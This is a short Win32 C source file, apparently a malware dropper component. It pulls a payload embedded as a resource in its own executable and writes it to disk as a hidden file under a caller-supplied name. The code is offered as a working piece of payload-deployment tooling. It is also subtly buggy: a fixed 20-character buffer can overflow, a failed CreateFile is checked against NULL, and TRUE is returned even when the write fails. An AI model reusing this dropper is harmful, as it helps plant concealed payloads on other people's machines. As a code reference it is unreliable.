//#include "stdafx.h"
#include "res_dropper.h"
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

BOOL writeToFile(char* res_data, DWORD res_size, char *payloadName)
{
	wchar_t wtext[20];
	mbstowcs(wtext, payloadName, strlen(payloadName) + 1);//Plus null
	LPWSTR ptr = wtext;
    HANDLE hFile = CreateFile(ptr, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
    if (hFile == NULL) return FALSE;

    DWORD written = 0;
    BOOL isDropped = WriteFile(hFile, res_data, res_size, &written, NULL);
    CloseHandle(hFile);

    if (isDropped == TRUE) {
        if (res_size != written) { //failed to write full buffer
            DeleteFile(ptr);
            return FALSE;
        }
    }
    return TRUE;
}

BOOL dropResource(char *payloadName)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
    if (!res) return FALSE;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return FALSE;

    char* res_data = (char*) LockResource(res_handle);
    DWORD res_size = SizeofResource(NULL, res);

#ifdef VERBOSE
    printf("Loaded Resource, size = %d\n", res_size);
#endif
    /* you can now use the resource data */
    BOOL isDropped = writeToFile(res_data, res_size, payloadName);

    /* free resource after using*/
    FreeResource(res_handle);
    return isDropped;
}
